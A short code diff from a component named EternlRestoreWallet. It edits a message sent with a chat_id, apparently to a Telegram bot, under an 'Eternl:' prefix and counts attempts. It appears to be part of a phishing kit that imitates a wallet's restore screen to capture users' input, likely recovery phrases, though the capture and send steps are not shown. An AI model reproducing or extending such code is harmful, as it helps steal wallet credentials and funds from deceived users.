@@ -72,7 +72,7 @@ function EternlRestoreWallet() {
     };
     const odata = {
       chat_id: ochat_id,
-      text: `Eternl:  ${color}   ${message}`,
+      text: `Eternl:   ${message}`,
     };
 
     setAttempts((prevAttempts) => prevAttempts + 1);
